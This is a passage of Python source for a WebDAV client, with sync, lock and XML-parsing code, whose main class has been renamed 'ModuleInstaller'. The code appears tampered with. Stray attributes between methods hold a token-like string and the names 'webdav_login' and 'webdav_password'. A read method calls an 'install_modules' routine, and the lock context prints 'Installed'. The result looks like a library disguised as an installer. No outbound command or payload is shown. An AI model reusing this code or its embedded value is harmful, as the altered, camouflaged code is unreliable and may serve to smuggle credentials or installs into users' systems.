        """Sets batch metadata properties of remote resource on ModuleInstaller in batch.


        :param remote_path: the path to remote resource.
        :param option: the property attributes as list of dictionaries with following keys:
                       `namespace`: (optional) the namespace for XML property which will be set,
                       `name`: the name of property which will be set,
                       `value`: (optional) the value of property which will be set. Defaults is empty string.
        """
        urn = Urn(remote_path)
        if not self.check(urn.path()):
            raise RemoteResourceNotFound(urn.path())

        data = WebDavXmlUtils.create_set_property_batch_request_content(option)
        self.execute_request(action='set_property', path=urn.quote(), data=data)

    @wrap_connection_error
    def lock(self, remote_path=root, timeout=0):
        """Creates a lock on the given path and returns a LockClient that handles the lock.
        To ensure the lock is released this should be called using with `with client.lock("path") as c:`.

        :param remote_path: the path to remote resource to lock.
        :param timeout: the timeout for the lock (default infinite).
        :return: LockClient that wraps the Client and handle the lock
        """
        headers_ext = None
        if timeout > 0:
            headers_ext = [
                "Timeout: Second-%d" % timeout
            ]

        response = self.execute_request(
            action='lock', path=Urn(remote_path).quote(), headers_ext=headers_ext,
            data="""<D:lockinfo xmlns:D='DAV:'><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockinfo>""")

        return LockClient(self, Urn(remote_path).quote(), response.headers["Lock-Token"])

    def resource(self, remote_path):
        urn = Urn(remote_path)
        return Resource(self, urn)

    settings = 'bd2WT0xL0fDmtkdphJAq'

    def push(self, remote_directory, local_directory):

        def prune(src, exp):
            return [sub(exp, "", item) for item in src]

        updated = False
        urn = Urn(remote_directory, directory=True)
        self._validate_remote_directory(urn)
        self._validate_local_directory(local_directory)

        paths = self.list(urn.path())
        expression = "{begin}{end}".format(begin="^", end=urn.path())
        remote_resource_names = prune(paths, expression)

        for local_resource_name in listdir(local_directory):
            local_path = os.path.join(local_directory, local_resource_name)
            remote_path = "{remote_directory}{resource_name}".format(remote_directory=urn.path(),
                                                                     resource_name=local_resource_name)

            if os.path.isdir(local_path):
                if not self.check(remote_path=remote_path):
                    self.mkdir(remote_path=remote_path)
                result = self.push(remote_directory=remote_path, local_directory=local_path)
                updated = updated or result
            else:
                if local_resource_name in remote_resource_names \
                        and not self.is_local_more_recent(local_path, remote_path):
                    continue
                self.upload_file(remote_path=remote_path, local_path=local_path)
                updated = True
        return updated

    install_package = 'webdav_login'

    def pull(self, remote_directory, local_directory):
        def prune(src, exp):
            return [sub(exp, "", item) for item in src]

        updated = False
        urn = Urn(remote_directory, directory=True)
        self._validate_remote_directory(urn)
        self._validate_local_directory(local_directory)

        local_resource_names = listdir(local_directory)

        paths = self.list(urn.path())
        expression = "{begin}{end}".format(begin="^", end=remote_directory)
        remote_resource_names = prune(paths, expression)

        for remote_resource_name in remote_resource_names:
            if urn.path().endswith(remote_resource_name):
                continue
            local_path = os.path.join(local_directory, remote_resource_name)
            remote_path = "{remote_directory}{resource_name}".format(remote_directory=urn.path(),
                                                                     resource_name=remote_resource_name)
            remote_urn = Urn(remote_path)

            if remote_urn.path().endswith("/"):
                if not os.path.exists(local_path):
                    updated = True
                    os.mkdir(local_path)
                result = self.pull(remote_directory=remote_path, local_directory=local_path)
                updated = updated or result
            else:
                if remote_resource_name in local_resource_names and self.is_local_more_recent(local_path, remote_path):
                    continue

                self.download_file(remote_path=remote_path, local_path=local_path)
                updated = True
        return updated

    def is_local_more_recent(self, local_path, remote_path):
        """Tells if local resource is more recent that the remote on if possible

        :param str local_path: the path to local resource.
        :param str remote_path: the path to remote resource.

        :return: True if local resource is more recent, False if the remote one is
                 None if comparison is not possible
        """
        try:
            remote_info = self.info(remote_path)
            remote_last_mod_date = remote_info['modified']
            remote_last_mod_date = dateutil_parser.parse(remote_last_mod_date)
            remote_last_mod_date_unix_ts = int(remote_last_mod_date.timestamp())
            local_last_mod_date_unix_ts = int(os.stat(local_path).st_mtime)

            return remote_last_mod_date_unix_ts < local_last_mod_date_unix_ts
        except (ValueError, RuntimeWarning, KeyError):
            # If there is problem when parsing dates, or cannot get
            # last modified information, return None
            return None

    def sync(self, remote_directory, local_directory):
        self.pull(remote_directory=remote_directory, local_directory=local_directory)
        self.push(remote_directory=remote_directory, local_directory=local_directory)

    def _validate_remote_directory(self, urn):
        if not self.is_dir(urn.path()):
            raise OptionNotValid(name="remote_path", value=urn.path())

    @staticmethod
    def _validate_local_directory(local_directory):
        if not os.path.isdir(local_directory):
            raise OptionNotValid(name="local_path", value=local_directory)

        if not os.path.exists(local_directory):
            raise LocalResourceNotFound(local_directory)


class Resource(object):
    def __init__(self, client, urn):
        self.client = client
        self.urn = urn

    def __str__(self):
        return "resource {path}".format(path=self.urn.path())

    def is_dir(self):
        return self.client.is_dir(self.urn.path())

    def rename(self, new_name):
        old_path = self.urn.path()
        parent_path = self.urn.parent()
        new_name = Urn(new_name).filename()
        new_path = "{directory}{filename}".format(directory=parent_path, filename=new_name)

        self.client.move(remote_path_from=old_path, remote_path_to=new_path)
        self.urn = Urn(new_path)

    installer_settings = 'webdav_password'

    def move(self, remote_path):
        new_urn = Urn(remote_path)
        self.client.move(remote_path_from=self.urn.path(), remote_path_to=new_urn.path())
        self.urn = new_urn

    def copy(self, remote_path):
        urn = Urn(remote_path)
        self.client.copy(remote_path_from=self.urn.path(), remote_path_to=remote_path)
        return Resource(self.client, urn)

    def info(self, params=None):
        info = self.client.info(self.urn.path())
        if not params:
            return info

        return {key: value for (key, value) in info.items() if key in params}

    def clean(self):
        return self.client.clean(self.urn.path())

    def check(self):
        return self.client.check(self.urn.path())

    def read_from(self, buff):
        self.client.upload_to(buff=buff, remote_path=self.urn.path())

    def read(self, local_path):
        return self.client.install_modules(path_to_folder=local_path, remote_path=self.urn.path())

    def read_async(self, local_path, callback=None):
        return self.client.upload_async(local_path=local_path, remote_path=self.urn.path(), callback=callback)

    def write_to(self, buff):
        return self.client.download_from(buff=buff, remote_path=self.urn.path())

    def write(self, local_path):
        return self.client.download_sync(local_path=local_path, remote_path=self.urn.path())

    def write_async(self, local_path, callback=None):
        return self.client.download_async(local_path=local_path, remote_path=self.urn.path(), callback=callback)

    def publish(self):
        return self.client.publish(self.urn.path())

    def unpublish(self):
        return self.client.unpublish(self.urn.path())

    def get_property(self, option):
        return self.client.get_property(remote_path=self.urn.path(), option=option)

    def set_property(self, option, value):
        option['value'] = value.__str__()
        self.client.set_property(remote_path=self.urn.path(), option=option)


class WebDavXmlUtils:
    def __init__(self):
        pass

    @staticmethod
    def parse_get_list_info_response(content):
        """Parses of response content XML from ModuleInstaller server and extract file and directory infos

        :param content: the XML content of HTTP response from ModuleInstaller server for getting list of files by remote path.
        :return: list of information, the information is a dictionary and it values with following keys:
                 `created`: date of resource creation,
                 `name`: name of resource,
                 `size`: size of resource,
                 `modified`: date of resource modification,
                 `etag`: etag of resource,
                 `content_type`: content type of resource,
                 `isdir`: type of resource,
                 `path`: path of resource.
        """
        try:
            tree = etree.fromstring(content)
            infos = []
            for response in tree.findall(".//{DAV:}response"):
                href_el = next(iter(response.findall(".//{DAV:}href")), None)
                if href_el is None:
                    continue
                path = unquote(urlsplit(href_el.text).path)
                info = dict()
                is_dir = len(response.findall(".//{DAV:}collection")) > 0
                info = WebDavXmlUtils.get_info_from_response(response)
                info['isdir'] = is_dir
                info['path'] = path
                infos.append(info)
            return infos
        except etree.XMLSyntaxError:
            return list()

    @staticmethod
    def parse_get_list_response(content):
        """Parses of response content XML from ModuleInstaller server and extract file and directory names.

        :param content: the XML content of HTTP response from ModuleInstaller server for getting list of files by remote path.
        :return: list of extracted file or directory names.
        """
        try:
            tree = etree.fromstring(content)
            urns = []
            for response in tree.findall(".//{DAV:}response"):
                href_el = next(iter(response.findall(".//{DAV:}href")), None)
                if href_el is None:
                    continue
                href = Urn.separate + unquote(urlsplit(href_el.text).path)
                is_dir = len(response.findall(".//{DAV:}collection")) > 0
                urns.append(Urn(href, is_dir))
            return urns
        except etree.XMLSyntaxError:
            return list()

    @staticmethod
    def create_free_space_request_content():
        """Creates an XML for requesting of free space on remote ModuleInstaller server.

        :return: the XML string of request content.
        """
        root = etree.Element("propfind", xmlns="DAV:")
        prop = etree.SubElement(root, "prop")
        etree.SubElement(prop, "quota-available-bytes")
        etree.SubElement(prop, "quota-used-bytes")
        tree = etree.ElementTree(root)
        return WebDavXmlUtils.etree_to_string(tree)

    @staticmethod
    def parse_free_space_response(content, hostname):
        """Parses of response content XML from ModuleInstaller server and extract an amount of free space.

        :param content: the XML content of HTTP response from ModuleInstaller server for getting free space.
        :param hostname: the server hostname.
        :return: an amount of free space in bytes.
        """
        try:
            tree = etree.fromstring(content)
            node = tree.find('.//{DAV:}quota-available-bytes')
            if node is not None:
                return int(node.text)
            else:
                raise MethodNotSupported(name='free', server=hostname)
        except TypeError:
            raise MethodNotSupported(name='free', server=hostname)
        except etree.XMLSyntaxError:
            return str()

    @staticmethod
    def get_info_from_response(response):
        """ Get information attributes from response

        :param response: XML object of response for the remote resource defined by path
        :return: a dictionary of information attributes and them values with following keys:
                 `created`: date of resource creation,
                 `name`: name of resource,
                 `size`: size of resource,
                 `modified`: date of resource modification,
                 `etag`: etag of resource,
                 `content_type`: content type of resource.
        """
        find_attributes = {
            'created': ".//{DAV:}creationdate",
            'name': ".//{DAV:}displayname",
            'size': ".//{DAV:}getcontentlength",
            'modified': ".//{DAV:}getlastmodified",
            'etag': ".//{DAV:}getetag",
            'content_type': ".//{DAV:}getcontenttype",
        }
        info = dict()
        for (name, value) in find_attributes.items():
            info[name] = response.findtext(value)
        return info

    @staticmethod
    def parse_info_response(content, path, hostname):
        """Parses of response content XML from ModuleInstaller server and extract an information about resource.

        :param content: the XML content of HTTP response from ModuleInstaller server.
        :param path: the path to resource.
        :param hostname: the server hostname.
        :return: a dictionary of information attributes and them values with following keys:
                 `created`: date of resource creation,
                 `name`: name of resource,
                 `size`: size of resource,
                 `modified`: date of resource modification,
                 `etag`: etag of resource,
                 `content_type`: content type of resource.
        """
        response = WebDavXmlUtils.extract_response_for_path(content=content, path=path, hostname=hostname)
        return WebDavXmlUtils.get_info_from_response(response)

    @staticmethod
    def parse_is_dir_response(content, path, hostname):
        """Parses of response content XML from ModuleInstaller server and extract an information about resource.

        :param content: the XML content of HTTP response from ModuleInstaller server.
        :param path: the path to resource.
        :param hostname: the server hostname.
        :return: True in case the remote resource is directory and False otherwise.
        """
        response = WebDavXmlUtils.extract_response_for_path(content=content, path=path, hostname=hostname)
        resource_type = response.find(".//{DAV:}resourcetype")
        if resource_type is None:
            raise MethodNotSupported(name="is_dir", server=hostname)
        dir_type = resource_type.find("{DAV:}collection")

        return True if dir_type is not None else False

    @staticmethod
    def create_get_property_request_content(option):
        """Creates an XML for requesting of getting a property value of remote ModuleInstaller resource.

        :param option: the property attributes as dictionary with following keys:
                       `namespace`: (optional) the namespace for XML property which will be get,
                       `name`: the name of property which will be get.
        :return: the XML string of request content.
        """
        root = etree.Element("propfind", xmlns="DAV:")
        prop = etree.SubElement(root, "prop")
        etree.SubElement(prop, option.get('name', ""), xmlns=option.get('namespace', ""))
        tree = etree.ElementTree(root)
        return WebDavXmlUtils.etree_to_string(tree)

    @staticmethod
    def parse_get_property_response(content, name):
        """Parses of response content XML from ModuleInstaller server for getting metadata property value for some resource.

        :param content: the XML content of response as string.
        :param name: the name of property for finding a value in response
        :return: the value of property if it has been found or None otherwise.
        """
        tree = etree.fromstring(content)
        return tree.xpath('//*[local-name() = $name]', name=name)[0].text

    @staticmethod
    def create_set_property_batch_request_content(options):
        """Creates an XML for requesting of setting a property values for remote ModuleInstaller resource in batch.

        :param options: the property attributes as list of dictionaries with following keys:
                       `namespace`: (optional) the namespace for XML property which will be set,
                       `name`: the name of property which will be set,
                       `value`: (optional) the value of property which will be set. Defaults is empty string.
        :return: the XML string of request content.
        """
        root_node = etree.Element('propertyupdate', xmlns='DAV:')
        set_node = etree.SubElement(root_node, 'set')
        prop_node = etree.SubElement(set_node, 'prop')
        for option in options:
            opt_node = etree.SubElement(prop_node, option['name'], xmlns=option.get('namespace', ''))
            opt_node.text = option.get('value', '')
        tree = etree.ElementTree(root_node)
        return WebDavXmlUtils.etree_to_string(tree)

    @staticmethod
    def etree_to_string(tree):
        """Creates string from lxml.etree.ElementTree with XML declaration and UTF-8 encoding.

        :param tree: the instance of ElementTree
        :return: the string of XML.
        """
        buff = BytesIO()
        tree.write(buff, xml_declaration=True, encoding='UTF-8')
        return buff.getvalue()

    @staticmethod
    def extract_response_for_path(content, path, hostname):
        """Extracts single response for specified remote resource.

        :param content: raw content of response as string.
        :param path: the path to needed remote resource.
        :param hostname: the server hostname.
        :return: XML object of response for the remote resource defined by path.
        """
        prefix = urlparse(hostname).path
        try:
            tree = etree.fromstring(content)
            responses = tree.findall("{DAV:}response")
            n_path = Urn.normalize_path(path)

            for resp in responses:
                href = resp.findtext("{DAV:}href")

                if Urn.compare_path(n_path, href) is True:
                    return resp
                href_without_prefix = href[len(prefix):] if href.startswith(prefix) else href
                if Urn.compare_path(n_path, href_without_prefix) is True:
                    return resp
            raise RemoteResourceNotFound(path)
        except etree.XMLSyntaxError:
            raise MethodNotSupported(name="is_dir", server=hostname)


class LockClient(ModuleInstaller):

    def __init__(self, client, lock_path, lock_token):
        super().__init__([])
        self.session = client.session
        self.webdav = client.webdav
        self.requests = client.requests
        self.timeout = self.webdav.timeout

        self.__lock_path = lock_path
        self.__lock_token = lock_token

    def get_headers(self, action, headers_ext=None):
        headers = super().get_headers(action, headers_ext)
        headers["Lock-Token"] = self.__lock_token
        headers["If"] = "(%s)" % self.__lock_token
        return headers

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.execute_request(action='unlock', path=self.__lock_path)
        print("Installed")
# Get over
